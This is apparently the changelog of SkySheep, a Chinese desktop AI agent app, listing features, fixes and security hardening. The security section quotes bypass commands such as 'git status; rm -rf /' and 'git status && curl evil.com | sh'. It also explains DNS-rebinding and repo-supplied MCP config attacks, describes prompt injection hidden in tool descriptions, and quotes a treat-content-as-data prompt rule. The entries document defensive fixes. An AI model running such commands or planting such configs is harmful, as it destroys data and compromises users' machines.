  只允许本机切换（tailnet 来源按远端处理）。Tailscale 地址靠被动枚举本机网卡（100.64 开头
  的虚拟网卡），没检测到时设置页给出安装指引；非安全上下文复制地址的 execCommand 兜底抽成
  两处共用。WS 协议新增 remote.status / remote.enable / remote.disable。

- **联网搜索新增「自定义」服务商**：此前只能从博查 / Tavily / 智谱 三家里选，自建搜索
  （SearXNG 等）无处可填。现在设置 · 技能与工具 · 联网搜索多了「自定义（自建搜索服务）」
  档：只填接口地址即可用，**Key 可留空**（自建 SearXNG 默认无需鉴权）。一份配置自动适配
  两种协议——地址指向 SearXNG（含 `searx`、`format=json`，或只有主机无路径的
  `http://localhost:8080`）走 `GET /search?q=...&format=json`，其它地址按 POST JSON + Bearer
  调用；两种协议互相备重试（404/405，或响应不是 JSON——SearXNG 的 POST /search 正是回
  HTML 页面——都会自动换另一种），所以不必先搞清楚自己那套服务算哪一类。返回结果宽容解析，
  同时兼容 SearXNG 的 `results[]`、博查式 `data.webPages.value[]`、智谱式 `search_result[]`
  与 `data.results[]` / 裸数组等常见结构。

  该档不对地址做公网校验（自建 SearXNG 常跑在 localhost / 内网，这正是典型用法）：地址
  只能由用户在设置页写入，模型无法通过工具参数指定它，与 web_fetch 可被模型任意指定 URL
  的风险面不同。自定义档**不参与「自动」**——自动档只在博查 / Tavily / 智谱 里按顺序取，
  自建服务必须用户主动选中才会生效。

- **设置 · 白名单页从「只能看和删」升级为完整管理**：规则预告、手动添加、时间与风险标注、
  撤销 / 清空、规则测试器、导入导出，一次补齐。
  - **确认弹窗预告「总是允许」的放行范围**：点按钮前就能看到将生成的规则（如
    「write_file · 整个工具（全部）」）。预告与落库共用同一个规则对象，弹窗展示的范围就是
    实际生效的范围，不会再出现「以为只放行这个文件、结果放行了整个工具」；终端 REPL 的
    确认面板同步显示这行预告；
  - **手动添加规则**：面板可主动创建规则，包括此前有匹配逻辑却没有生成入口的 **glob 通配**
    （如 `docs/*.md`），开新项目可预置常用命令；危险组合（如 run_command + 整个工具）
    红色警示并要求勾选确认。添加与导入属降防护操作，局域网模式（lan=true）下只能在本机操作
    （与「自动允许写入」同一约束）；
  - **创建时间、风险分层与来源标注**：每条规则显示添加时间（「刚刚 / N 天前」）；
    「整个工具」放行写 / 高危工具时用金色点标识，列表顶部摘要注明整工具放行的条数；
    exact 规则标注来源（键盘内容 / 剪贴板内容 / 关窗标题 / 含拼接的命令）；
  - **删除撤销与批量清空**：单条删除与「清空」（二次确认）都可在状态行一键撤销恢复；
  - **规则测试器**：输入工具名 + 参数文本，直接看会命中哪条规则、或因 shell 拼接被拦——
    与授权共用同一套匹配逻辑（gate.explain），测试结果就是实际行为；
  - **导出 / 导入**：规则导出为 JSON（skysheep-whitelist-*.json），可在其它项目导入复用；
    合并模式，重复或不合法条目自动跳过。

- **技能独立页（呈现 / 使用范围 / 技能广场）**：设置 · 技能与工具 的「技能」卡片改为
  整行可点入口，点进去是独立技能页，三件事在同一个页面上做完：
  - **呈现**：列出全部技能（名称 / 来源 / 状态 / 描述），点技能名可查看 SKILL.md
    完整指令（停用的也能看，否则无从判断该不该启用）；
  - **使用范围**：全局技能可选「所有项目 / 指定项目（多选）/ 任何项目都不用」，
    配置存在 `~/.skysheep/skills-scope.json`，**跨项目统一管理**；项目级技能天生只属于
    一个项目，范围固定为「仅本项目」；
  - **技能广场**：内嵌为页内可折叠区块，展开时才拉索引（不展开不发请求），
    保留关键词搜索（名称/描述/作者/地址四字段匹配、空格分隔的多个关键词全命中、
    命中处高亮；高亮一律先转义再拼标签，索引内容来自外部不可直接信任）。

  这里把「范围」与「启用」分成两个正交的轴：**范围**跨项目（这个技能属于哪些项目），
  **启用**只在当前项目（沿用原有 `.skysheep/skills.json`，老数据不动）。真正进系统提示词
  的条件是两者都满足。界面按当前项目如实呈现三态——**生效中 / 本项目已停用 /
  本项目不适用**；范围不包含当前项目时不再显示本项目开关（此时它没有意义，只会让人
  以为开关坏了）。被排除的技能仍留在列表里，否则在被排除的项目里就再也改不回来。

  路径比较走 `normcase` 归一（Windows 大小写不敏感）；范围里引用了已不存在的项目路径时
  **不静默丢弃**，保留配置并以原始路径显示，由用户自己取消勾选。技能页在
  设置 · 技能与工具 里进入，与「模型服务」共用同一套列表/详情范式（进设置即回总览）。

### 修复

- **开启局域网 / 远程访问后，桌面窗口自己弹出「需要访问令牌」**：令牌守卫此前对**所有**
  来源生效（含本机回环），而桌面窗口加载的地址不带令牌——只要开了「手机控制」（局域网），
  重启后本机界面就被自己的防线拦在门外，只显示羊头 403 页。现在**本机（回环）连接在任何
  模式下都免令牌**：守卫的职责是挡别的设备，本机本来就能读配置文件，不构成防线对象；
  局域网 / tailnet 远端仍必须验令牌，非 tailnet 来源在仅远程模式下依旧直接拒绝。
  顺带把桌面窗口固定加载 `http://127.0.0.1:端口/`（此前局域网模式会加载 `0.0.0.0`——那是
  绑定地址不是访问地址），拦截页里过期的「设置 · 局域网访问」文案也更正为「设置 · 手机控制」。

- **右面板「项目记忆」整块编辑区底色与别的标签页不一样**：编辑区铺的是「抬升纸面」
  （`--paper-raised`），而任务清单 / 日程 / 定时任务都是直接铺在面板纸色上，于是这个标签页
  像贴了另一张纸；编辑区还自带一条 1.5px 上边线，与工具条的下边线叠成双线。现在编辑区
  底色与面板一致（不再自带上边线，分隔线由工具条的 `border-bottom` 提供，只剩一条），
  焦点提示改为内描一圈交互蓝（`outline` 本来就是关的，Tab 进来仍看得出焦点在哪），
  占位文字跟进主题的 `--dim`。浅色与「夜墨」深色两套都实机核对过。

- **设置 · 全局记忆的保存结果跑到了右面板「项目记忆」的状态行上**：`index.html` 里
  「全局记忆」卡片的状态行与右面板「项目记忆」的状态行都叫 `id="memory-status"`，
  而 `getElementById` 只返回文档里靠前的那个（右面板）。结果在设置页点保存后本页毫无反应，
  右边面板的状态行反倒被写上「✓ 已保存，之后所有会话立即生效」——看起来像项目记忆被改了。
  现在设置页那处改用 `memory-global-status`（`app.js` 同步），保存结果回到自己的卡片里。

- **「会话库备份」列表把整页撑满、时间还全一样**：20 份备份一行一个「恢复到此版本」
  按钮，设置 · 关于里的卡片被拉得又长又空；而且每行显示的时间取自文件 mtime——备份是
  `shutil.copy2` 复制的，会连源库的修改时间一起带过来，于是 20 份全写「源库最后一次写入」
  那一刻，看起来像一堆重复项。现在列表默认只列「当前数据 + 最近 3 份」，其余折叠到行尾的
  「展开其余 N 份更早的备份」后面；时间改用文件名里的备份时刻（精确到秒，`list_backups`
  新增 `taken` 字段），恢复动作自动留下的那份标「恢复前」（`safety` 字段）；行内按钮降为
  行内小动作，整行高度减半，一行显示「时间 · 大小 · 恢复到此版本」。

- **技能广场里 anthropics 的 4 个文档技能装不上**（报「链接指向的目录里没有找到
  技能（没有 SKILL.md）：document-skills/docx」）：上游 `anthropics/skills` 已把技能从
  `document-skills/` 移到 `skills/`，索引里的旧链接全部失效。`market/index.json` 与内置
  清单的 4 条链接同步修正（实测 docx / pdf / pptx / xlsx 均可下载安装）。
  另外把这类报错做成可操作的提示：直接说清楚链接里哪段过期、该改成什么（例
  「把地址中的目录换成：skills/docx」）；提示会列出包内实际找到的技能目录，剥掉归档
  外层的 `repo-main/` 包装，路径正好是用户在链接里该写的那一段。设置页的状态行现在
  也保留换行（`white-space: pre-wrap`），多行提示不再挤成一长行。

  > 客户端拉的是 GitHub 上的在线索引，这几条链接需**推送后**才对用户生效；
  > 已安装失败过的用户，更新后重试即回。

- **技能广场经常提示「在线索引暂时拉取不到」/ 删除后重装“像没生效”**：两个独立问题。

  ① 拉索引写死了 `trust_env=False`（忽略系统代理）。直连
  `raw.githubusercontent.com` 不稳定（同一台机器实测时而 0.7s 成功、时而 6s 超时），
  而装了代理的机器（如 `127.0.0.1:7890`）走代理 0.8s 就回来。现在改成**先试系统
  代理、失败再直连**，两条都不通才回退内置清单（永不抛错）；技能下载走 urllib，
  本来就读系统代理，两边行为一致了。

  ② 删除技能时只删了目录，**没清它留在 `skills.json`（当前项目停用名单）与
  `skills-scope.json`（使用范围）里的记录**——两者都以技能名为 key。先停用过（或
  设过范围）、再删除、然后重新安装的同名技能，会默默变成“已停用 / 任何项目都
  不用”，界面上看不出原因，现象就是「装上像没生效」。现在删除时顺手抹掉这两处
  记录，重装的技能从干净状态开始（新增 `SkillLoader.forget()`）。

- **改了前端要手动强刷才生效**：前端零构建、文件名不带指纹，WebView 沿用缓存里的
  `app.js` 会让改动看不见。`/` 与 `app.js` / `app.css` / `index.html` 现在带
  `Cache-Control: no-store`；`static/vendor/`（mermaid 等第三方构建产物，单文件最大
  3.3MB）刻意不加——它们体积大且不随手写代码变，局域网手机访问时靠 ETag 协商就够。

- **「会话库备份」卡片太长，且 20 份备份显示成同一时刻**：关于页那张卡片一屏铺不下
  21 行，每行还各带一个「恢复到此版本」按钮。现在默认只列「当前数据 + 最近 3 份」，
  其余折叠到列表末尾的「展开其余 N 份更早的备份」按钮后面（实测卡片高度 720px → 260px），
  行高与按钮也各收一档。顺带修掉时间显示错误：备份是 `shutil.copy2` 复制的，会连源库的
  修改时间一起带过来，此前按 mtime 显示，20 份备份全变成「源库最后一次写入」那一刻、
  看起来像一堆重复项；现在按文件名里的备份时刻排序并显示，并给恢复动作自动留下的
  「-恢复前」副本加标签，免得和启动备份混淆（`list_backups()` 新增 `taken` / `safety`
  两个字段，`current` 一项的 `taken` 退回它自己的 mtime）。

### 安全

- **终端面板的命令不再接受局域网远端调用**：右侧「终端」标签页的命令由用户手敲、不进
  权限门（`TerminalManager`），这在本机是成立的。但局域网模式下（`lan=true`）任何拿到
  令牌的设备都能连 WS，若允许它调 `term.run`，令牌实际上等于 shell 访问权限——与本产品
  「降低防护的开关只能在本机操作」的原则冲突。现在该方法的远端调用直接拒绝（`term.stop`
  仍放行，否则远程发起的命令停不下来）。

- **用户自己改项目级配置不再把自己踢回「待确认」**：上一版引入工作区信任后有一个副作用：
  信任过某项目后，用户在设置页往当前项目装技能 / 加 MCP 服务，项目级配置的内容变了、
  指纹跟着变，于是又回到「待确认」，刚装的东西当即失效——表现正是“装上了却像没生效”。
  现在用户主动写项目级配置（装/删技能、导入/新增 MCP 服务）时会同步指纹，
  只在**已信任**时生效（未信任不会因为装了一个技能就把仓库里其它东西一并放行）。

- **打开项目不再自动执行仓库自带的配置（workspace trust）**：项目目录下的
  `.skysheep/mcp.json` 与 `.skysheep/skills/` 是随仓库分发的**数据**，但前者会在后端
  初始化阶段被直接 `subprocess` 拉起（stdio 传输），后者会被拼进系统提示词。结果是：
  用户只是「打开了一个目录」，就会在没有任何确认、也没有「是否信任此工作区」提示的情况下
  执行仓库里的本地命令、或让仓库里的文本影响模型行为。配合项目级配置**同名覆盖全局配置**
  的规则，攻击者只要提交一个 `.skysheep/mcp.json` 覆盖用户已信任的服务（如 `fetch`），
  把 `command` 指向任意可执行文件即可；若同时写 `readonly: true`，该服务器后续的工具调用
  也会被模型自动执行、无需二次确认。这是典型的 workspace-trust 类供应链风险。

  现在引入一层显式的**工作区信任**（`security/trust.py`）：
  - 首次打开带项目级配置的目录时，界面顶部横幅列出「这个项目想执行什么」（命令原文、
    技能名）并要求确认；再点「看详情」可看完整清单与理由。**确认前**项目级 `mcp.json`
    不会被读取、项目级技能不会被发现（后端按信任状态把这两个路径整体跳过，而不是读进来
    再过滤）；
  - 信任记录按项目路径存在**用户主目录** `~/.skysheep/workspace-trust.json`，不放项目里——
    放项目里等于让仓库连同信任记录一起提交、自我授权；
  - 记录里存项目级配置的**内容指纹**。配置一变指纹就对不上，需要重新确认——否则攻击者
    可以先提交一个无害配置骗取信任，之后再推恶意配置进来；
  - 全局配置（`~/.skysheep/mcp.json`、`~/.skysheep/skills/`）不受影响，那是用户自己主动写的，
    信任边界不同；
  - 信任状态按项目隔离，切换项目会重置缓存，不会把 A 项目的信任带到 B 项目；读不到/读坏了
    信任文件一律按「未信任」处理（fail closed）。

  CLI 同样收口：`skysheep chat` 在终端里问一次（默认不信任，回车即跳过）；无人值守的
  `skysheep run` 没有界面可问，只在显式传入 `--trust-project` 时启用项目级配置。
  设置页新增项目级 MCP 服务但尚未信任时，会明确提示「需要先信任本项目」，而不是让用户
  以为配置没生效；信任只能在本机界面上确认（与「自动允许写入」同一约束）。

- **`web_fetch` 补上 DNS rebinding（TOCTOU）防护**：此前先用独立的 `socket.getaddrinfo`
  校验「解析到公网 IP」，再交给 httpx 发请求——而 httpx 建连时会**自己再解析一次**，两次
  之间就是攻击窗口：攻击者控制的域名把 TTL 设得很低，校验那一次答公网 IP 通过检查，建连
  那一次改答 `127.0.0.1` 或云 metadata 地址（`169.254.169.254`）。`web_fetch` 是通用抓取
  工具、没有域名白名单（技能下载器有），模型可以让它访问任意域名，所以这条风险是实打实
  可利用的。现在改为「解析一次、校验一次、复用同一批 IP 建连」（IP pinning）：自定义
  `httpcore.AsyncNetworkBackend` 在网络层接管被固定主机的 `connect_tcp`，命中时直接连
  已校验的 IP，不再走 DNS；Host 头与 TLS SNI 仍用 URL 里的原主机名，虚拟主机与证书校验
  照常生效。一次解析同时给出公网与内网地址时**整个拒绝**（不能只挑能用的那个）；重定向
  每一跳都重新解析、校验并固定。

- **`web_fetch` 响应体改为流式读取，超限立即中止**：此前用非流式 `client.get()`，httpx
  会先把整个响应体读进内存，`MAX_RESPONSE_BYTES` 截断发生在下载完成**之后**——目标返回
  没有 `Content-Length` 的巨大响应或无限流时，内存会在截断之前就被吃干。现在边读边累计
  计数，超过 2 MB 直接停止读取并在结果里标注「响应体超过 2 MB，已截断」。

- **写入端补上大小上限**：读取端早有 `MAX_FILE_CHARS` 截断，写入端此前没有任何限制，
  模型（或被注入污染的上下文）可以一次写一个任意大的文件把磁盘写满。`write_file` /
  `write_document` 现在对单次写入内容设上限（500 万字符），超出**直接报错而不截断**——
  截断会写出一个内容不完整的文件却报告成功，后续读回来是半个文件，比拒绝更难排查。
  已经超过上限的存量文件仍允许被改小（不因存量挡住修复动作）。

- **动作级白名单的破坏性动作不再整类放行**：`mouse` / `window` / `browser` 的「总是允许」
  按动作词生成前缀规则，粒度到动作级是合理的取舍（同动作、意图一致、多数可撤销）。但其中
  两类动作不成立，已改为只固化当次参数（`exact`）：
  - **`window close`**：窗口按标题**子串**匹配，放行一次 close 等于允许关掉任意标题含该
    子串的窗口（子串很容易误中整个应用），而关闭不可逆；`activate` / `minimize` / `maximize`
    可逆且后果同质，保持动作级；
  - **`clipboard_write`**：此前不在动作白名单里，会退化成「整工具永久放行」——允许一次
    写剪贴板等于允许把任意内容写进剪贴板，包括用户即将粘贴的位置。现在只固化当次内容。

  确认弹窗与设置 · 白名单页同步把覆盖范围写清楚（如「同动作均放行：打开任意网址」
  「同动作均放行：点任意位置」），避免用户把「允许一次」误解成比实际更窄的授权。

- **MCP 工具描述加形状约束**：`description` 会原样拼进模型可见的工具列表，而协议本身不限
  长度、也不限内容——项目级服务器（打开项目即连接的那类）可以在这里夹带 prompt injection
  payload，过长描述还会挤占上下文。现在限长（1000 字符，超出截断并标注）并压掉连续空行
  （防止用大量空行把注入内容推到看不见的位置）。只做形状约束，不尝试识别「恶意指令」——
  那种判断放在按长度/格式的过滤里会既漏又误伤，真正的边界是连接的可信来源。

- **局域网自定义令牌加最小强度校验**：默认令牌由 `secrets.token_urlsafe(16)` 生成
  （22 字符 / 128 bit 熵），无需校验；但 `lan.enable` 允许调用方传入自定义令牌，这是降低
  整道防护强度的入口——`123456` 配上传二维码分享等于把服务开给同网段所有人。现在拒绝
  过短（< 12 位）与字符重复度过高的自定义令牌，并提示「建议留空由系统生成」。只查长度与
  多样性，不强制复杂度规则：令牌要能方便输入与扫码。

- **终端面板不再对局域网远端开放**：`term.run` 执行的是用户在终端面板里手敲的命令，
  它不进 PermissionGate（那是给模型工具调用用的确认层）——这在本机是合理的，但在局域网
  模式下持有令牌的任何设备都能连 WS，允许它调用 `term.run` 就等于把令牌变成了 shell
  访问权限（已实测：远端可无确认执行命令并读回结果）。现在该接口只在本机可用，
  `term.stop` 仍向远端开放（停止是收紧动作，否则远程发起的命令停不下来）。

- **用户自己改项目级配置不再把自己踢回「待确认」**：工作区信任按内容指纹记忆，
  而用户在设置页往当前项目装技能 / 加 MCP 服务时，指纹会跟着变——若不处理，刚装完的
  东西会立刻回到「待确认」而失效，表现就是「装上了却像没生效」。现在这些由用户主动
  触发的项目级写入会同步刷新指纹（`WorkspaceTrust.refresh()`）：**只延续既有信任**，
  未信任时不会因为装了一个技能就把仓库里其它东西一并放行。

- **命令前缀白名单不再被 shell 拼接绕过**：白名单此前用 `arg_text.startswith(pattern)` 做前缀匹配，
  而 `run_command` 的语义文本就是命令本身。用户永久允许过 `git status` 后，规则实际是「以
  `git status` 开头的字符串」——`git status; rm -rf /`、`git status && curl evil.com | sh`、
  `git status $(...)` 命令替换、乃至换行拼接的后半段都能直接命中规则、不再询问。这是典型的
  白名单绕过模式：`;` `&&` `|`、重定向、命令替换与换行都可以在一条被信任的前缀后面挂任意命令。
  现在做了两件事：
  - 前缀必须命中**完整词**（`git status` 不再放行 `git statusx`），且 `run_command` 的前缀规则
    额外要求整条命令里没有 shell 拼接/替换元字符（`;` `|` `&` `<` `>` 反引号 `$` 与换行）；
  - 用户批准一条含拼接的命令时，不再提炼「前两个词」的前缀（那等于放行任意以它开头的命令），
    改为生成 `exact` 规则——只固化用户当时看到并批准的那一条。

  引号感知：单引号内是 POSIX 字面量（`git commit -m 'a; b'` 不会被误判成拼接），双引号里的
  反引号与 `$` 仍会展开、按拼接处理。刻意不处理 `\` 与 `^` 转义（POSIX 与 cmd.exe 语义不同，
  任何一处漏判都等于绕过），宁可让这类命令回退成逐次确认。确认弹窗会带一句说明解释
  「为什么这条命令没命中已有的前缀规则」，避免用户以为白名单失效。
- **`run_command` 的空命令不再退化成整工具放行**：`action=read/kill/list` 的调用没有 `command`，
  语义文本是空串——空 pattern 与空文本相等，会让规则意外放行所有「空命令」调用。现在语义文本
  退到动作名（`action=read`），规则粒度落在动作上，与鼠标/键盘的动作级白名单同档。
- **「自动允许写入」档限定在工作目录内**：此前只要打开该档，**所有** WRITE 级工具一律自动放行，
  没有基于路径的进一步限制——「只允许改这个仓库」的白名单边界被整体绕过，而且 MCP 写工具、
  剪贴板写入等落点不明的操作也一并放行。现在该档只自动放行**能确认落在工作目录内**的写入：
  工具需声明写目标（`write_file` / `edit_file` / `write_document` / `generate_image` 已声明），
  路径经 `resolve()` 后必须位于工作目录内；目录外的写入、以及说不清落点的写工具仍逐次确认。
  这也堵住了一条升级链路：该档开启时，Agent 原本可以不确认就改 `~/.skysheep/` 下的
  `ui.json` / `mcp.json` / `config.toml`（都在工作目录外），现在这些写入会重新要求确认。
- **「自动允许写入」档只能在本机主动切换**：局域网模式（`lan=true`，服务监听 0.0.0.0）下任何拿到
  令牌的设备都能连 WS；该档会放宽所有写入的确认，属于降低防护的开关，现在远程调用
  `permission.set_mode` 切到 `accept_edits` 会被直接拒绝，`ui.save` 里的 `accept_edits` 字段
  也会被忽略（远端仍可切回 confirm 收紧），导入设置包时 ui.json 里的 `accept_edits` 同样丢弃。
  切换动作写 `skysheep.security` 日志，降低防护的操作可在 `~/.skysheep/logs/desktop.log` 事后追溯。
- **键盘工具不再按动作整类放行**：鼠标/窗口/浏览器的「总是允许」按动作词生成前缀规则（只放行
  click、只放行 activate…），粒度到动作级是合理的；但键盘不一样——`type` 的内容、`hotkey` 的
  键位就是对当前焦点窗口的任意操作，一条 `type` 前缀规则等于允许向任意窗口输入任意文本（包括
  在终端里敲命令）。现在键盘的「总是允许」只固化用户当时批准的那一次内容/键位，确认弹窗也
  直说这一点。
- **glob 白名单规则的大小写语义显式化**：`fnmatch.fnmatch` 会隐式调用 `normcase`（Windows 上
  大小写不敏感、其它平台敏感），规则行为随平台悄悄变化且不可预测。改用 `fnmatchcase` 并显式
  按文件系统语义归一（Windows 不敏感），规则行为与文件查找一致且可读。
- **工具新增 `write_path_arg` 声明**：告诉权限门「这个工具的写目标就是 args.path」。只有声明的
  工具才参与「自动允许写入」的目录边界判定，MCP 写工具等落点不明的操作默认不在自动档范围内
  （后续要给 MCP 工具开自动档时，应由用户按服务器逐项开启，而不是靠默认放行）。

### 变更

- **对话页模型切换菜单按「默认 / 自定义」分成两页**：下拉此前把所有已启用服务平铺一列，内置预设
  与自建服务混在一起，服务一多不好找。现在菜单顶部加了与侧栏搜索同款的分段页签——内置预设
  （deepseek / zhipu / moonshot / openrouter / siliconflow / anthropic / ollama）在「默认」页，
  设置里用户新增的服务在「自定义」页，本次会话内记住上次所在页；页内顺序、切换行为与
  「管理模型服务」入口不变，空页给指引（自定义页提示去管理页添加）。分页只看 `config.providers`
  已有的 `is_preset` 字段，后端无改动。

- **设置导航按「上手顺序 + 使用频率」重排**：此前「本项目白名单 / 高级」夹在中间，把日常要用的
  快捷指令、全局记忆、界面与通知挤到了列表下方。现在分四段：能力配置（模型服务 / 技能与工具 /
  子代理 / MCP 服务）→ 日常习惯（快捷指令 / 全局记忆 / 界面与通知）→ 安全与进阶（本项目白名单 /
  高级）→ 只读信息（用量 / 关于）。各设置页仍是各自独立的 `<section>`，切换只认 `data-target`，
  重排不影响页面与快捷键。

- **设置页「联网搜索 / AI 画图」的默认档不再点名厂家**：「自动」档此前写作「优先复用智谱
  Key」「智谱 → 硅基流动」，把默认策略与具体厂商绑在了一起。现在两处统一为「自动（优先复用
  已配置的 Key）」，卡片说明与「未配置」提示行也一并去掉厂家名（「配好任一服务商的 Key 即可
  零配置使用」）。下拉里用户主动选择的显式服务商（智谱 / 硅基流动 / 博查 / Tavily）仍带厂家名，
  否则无从判断该填哪家的 Key；「已就绪」状态行改为显示中文标签而非内部 provider 标识。
  AI 画图的「模型」输入框占位符同步从「如 cogview-3-flash」改为「留空用服务商默认模型」。

- **白名单规则的展示文案**：设置 · 白名单页把规则类型翻成中文（整个工具 / 前缀 / 仅此一条 / 通配），
  前缀规则旁标注「命令拼接不会命中」；页面说明也补上了这条边界。「自动允许写入」的开关提示、
  帮助页与 README 同步说明该档只覆盖工作目录内的写入。
- **会话标签条并入顶栏一行**：多会话标签（新会话 ×）此前单独占主区最顶行，顶栏再压一行，
  两行高度全用在标签上；现在标签条直接放进顶栏，与「？」帮助、通知中心、右侧面板开关**同处
  一行**（标签在左、图标按钮靠右），省掉一整行。标签样式不变（独立小胶囊、运行中圆点、
  待确认锁标），单会话时照旧整条隐藏；标签多到放不下时在本行内横向滚动（顶栏只有 30px 高，
  滚动条不占视觉），不会把右侧图标按钮挤出视口。窄屏（≤860px）同样成立，菜单按钮在最前。
- **「项目记忆」改为右侧面板标签**：原来从侧栏点开会弹一个模态对话框，编辑时既看不到对话也看不到
  别的面板；现在与日程/定时任务同款——侧栏「项目记忆」直接在右侧面板开标签（编辑区占满、
  底部状态行显示记忆文件路径与保存结果），支持「重读」（放弃修改重新读盘）与 **Ctrl+S 保存**，
  标签的打开/激活状态照常记进 ui.json，重启后恢复。项目记忆属于项目：切换工作项目时内容与
  加载标记作废、面板激活着就按新项目自动重读，不会把 A 项目的约定显示进 B 项目。

## [1.0] - 2026-09-17

### 新增

- **浏览器控制工具（browser：打开网页 / 搜索）**：Agent 此前只有 web_fetch（自己抓文本），
  没有「把网页展示给用户」的能力——「帮我打开这个链接」「搜一下给我看」只能干瞪眼。
  新增 `browser` 工具（open 用系统默认浏览器打开网址 / search 搜索关键词，支持
  bing/baidu/duckduckgo），页面在用户自己的浏览器里打开（返回文本明确提示模型：自己
  读内容仍走 web_fetch）。安全模型与电脑控制同档：DANGEROUS 逐次确认、「总是允许」
  按**动作**前缀生成（open / search 单独放行）；仅放行 http(s)（file://、javascript:
  一律拒绝）；子代理不配备。设置 · 高级新增「启用浏览器控制」开关（**默认关**，
  热生效与电脑控制同一套注册表重建机制）；系统提示词第 12 条同步补充使用规范。
- **设置 ·「📱 手机控制」卡片**：原「局域网访问」升级为手机控制视角——文案讲清
  「扫码即可以用完整界面遥控这台电脑上的 SkySheep（聊天 / 批准确认 / 看任务进度）」，
  新增「⧉ 复制地址」按钮（clipboard API 不可用的局域网 http 上下文自动走
  execCommand 兜底）；窄屏（≤860px，即手机端）首次连接时通知中心提示
  「📱 手机控制模式」，遥控端不再对着桌面界面发懵。
- **无 Key 用户的三条出路（首启激活）**：①首启向导每个预设服务附「注册获取 Key ↗」
  直达控制台；②向导自动检测本机 Ollama——检测到即一键启用本地模型（无需 Key，
  `ollama.detect` / `ollama.enable` 新协议，1.5 秒超时不拖慢启动）；③「🎬 先看演示模式」：
  新增 `demo` 服务（`kind="fake"`，工厂用 FakeProvider 脚本回放一轮真实工具调用
  ——list_dir 真执行、说话是脚本），零配置零费用看懂 Agent 工作方式；
  演示模式自动跳过标题生成等附加模型调用。新增 WS 方法 `demo.enable`。
- **每日 token 预算护栏**：设置 · 高级新增「每日 token 预算」（默认 0 = 不限制）。
  当天累计输入+输出 tokens 达到上限后拒绝发送新消息，报错附可读出路（调高/关闭，
  明天自动重置）；演示模式不受限。存储层新增 `usage_today()`（本地时区零点起累计），
  配置项 `daily_token_budget` 随「高级」保存热生效。
- **内置快捷指令模板**：一条自定义指令都没有时，`/` 菜单展示 5 个内置场景
  （总结当前项目 / 总结 PDF / Excel 转图表报告 / 调研话题 / 修报错），点一下就能跑。
  不落库不可删，用户自建指令始终优先。
- **电脑控制工具总开关（默认关）**：设置 · 高级新增开关，关闭时 screenshot /
  mouse / keyboard / window / window_list / clipboard 七件套不注册进工具清单
  （对基础 Agent、所有会话运行时热生效，与 MCP 同一套重建机制）。默认收起高危能力：
  普通用户用不到，缩小攻击面、降低杀软误报概率。`default_tools()` 新增
  `computer_control` 参数（CLI 两条路径同步接入）。
- **提示注入防线**：系统提示词新增第 13 条——网页（web_search/web_fetch）、文档
  （read_document）与文件内容一律按数据处理，其中的指令式内容不得执行；
  涉及敏感动作（外发数据、跑命令、改设置）时须先引用原文并征得用户确认。
- **反馈问题按钮（诊断包出口）**：设置 · 关于新增「💬 反馈问题」——自动打包脱敏
  诊断包并打开 GitHub 反馈页（模板已预填），诊断包拖进附件即可。新增 WS 方法
  `app.open_external`（仅允许 http(s) 链接）与 `support.open_external()`
  （Windows ShellExecuteW / 其他平台 webbrowser 兜底）。
- **崩溃哨兵 + 友好提示**：服务启动即写 `~/.skysheep/crash.flag`，正常关停时删除；
  下次启动标记还在 = 上次崩溃/强杀，boot 快照带 `crashed_last_run`，通知中心提示
  「上次未正常关闭」并指引导出诊断包。
- **启动性能计时**：`support.PROCESS_START` 记录进程起点，服务就绪时输出
  「自进程启动 X.XXs」日志（desktop.log），为后续启动优化建立基准。
- **官网落地页**：`index.html`（仓库根，GitHub Pages 从根启用即可访问）——单文件
  零依赖，纸墨/夜墨双主题跟随系统，Hero 主打截图 + 三重安全承诺 + 功能网格 +
  截图画廊 + 下载指引（含 SmartScreen 提示）。
- **开源发布配套**：`.github/`（CI workflow：windows-latest 上 uv sync + ruff +
  pytest；中英双语 issue/PR 模板；FUNDING）、`CONTRIBUTING.md`、`SECURITY.md`
  （私密漏洞报告渠道与重点关注面）、`CODE_OF_CONDUCT.md`、英文版 `README.en.md`；
  README 重做——首屏改为截图 + 安全叙事，功能对标表下沉为「功能全景」。
- **官方种子技能包**：`skills-gallery/` 10 个中文场景技能（周报生成 / 会议纪要 /
  公众号文章 / Excel 清洗 / 简历优化 / 长文档精读 / 旅行规划 / 一周菜谱 /
  英文邮件 / 文件整理），`market/index.json` 同步上架（主仓库推上 GitHub 后
  技能广场可直接一键安装）。

### 修复

- **切换主题时页面与系统标题栏变色时间不一致**：前端 CSS 变量瞬时变色，而 Windows
  标题栏靠桌面壳看板线程每 1 秒轮询一次模式值——每次切主题标题栏都慢半拍。改为
  事件驱动：`wintheme` 增加窗口注册（`register_window`）与 `refresh_now()`，
  `app.apply_theme` 在回写模式后立即重刷 DWM 标题栏与窗口底色（桌面壳与
  `skysheep app` 两条窗口路径都注册；浏览器模式无窗口时 no-op），看板轮询退化为兜底。
- `server/app.py` 中 `_first_paint_attrs` 意外重复定义两次（第二份覆盖第一份，
  行为无差但属隐患），删除重复。

## [0.8.0] - 2026-09-16

### 新增

- **聊天区支持 Markdown 表格 / 分隔线 / 删除线 / 缩进列表**：此前的迷你渲染器没有表格解析，
  模型做调研、总结、方案对比时输出的表格会显示成一堆 `|` 和 `---` 原文。现在按 GFM 规矩
  解析「表头 + 分隔行 + 连续数据行」并支持 `:---:` 对齐，表头描边加底、偶行浅底、窄窗里
  整表横向滚动而不是把消息卡片撑破；同时补上 `---` 分隔线、`~~删除线~~`、一级缩进嵌套列表。
  表格/列表/代码块会被空行独立成块，不再被误包进 `<p>`（顺带修掉了代码块此前被 `<p>` 包裹的
  结构问题）。`server/static/app.js` + `app.css`，纯前端、无新依赖。
- **添加文件按钮（任意位置的文件都能给 Agent 看）**：此前只有图片能进附件托盘，拖入
  PDF/Word/Excel 时按文件名匹配项目索引，项目外的文件只会提示「不在当前项目里」然后什么都不发生——
  而浏览器 Drop 事件本来就不给真实路径，用户没有别的办法。现在输入栏新增「添加文件」按钮，
  走原生选择框（可多选、带文档/代码/图片筛选），选中即在光标处插入 `@绝对路径`，系统提示词同步
  说明「@ 后面也可能是工作目录之外的绝对路径」，Agent 用 read_file / read_document 正常读取。
  浏览器模式（无原生桥）退化为手填路径的弹窗。图片仍建议粘贴/拖入（那才走多模态通道），
  选到图片文件时会明确提示这一点。
- **中文会话的上下文占用不再被低估**：token 估算原来一律按「字符数 ÷ 3.5」算，那是英文的经验值，
  中文实际约 1–1.5 字符一个 token，导致占用率显示偏低约 2 倍、自动压缩触发过晚，长中文会话
  有撞上上游上下文上限的风险。现在按字符类别折算（CJK 0.7 token/字符，西文 3.5 字符/token），
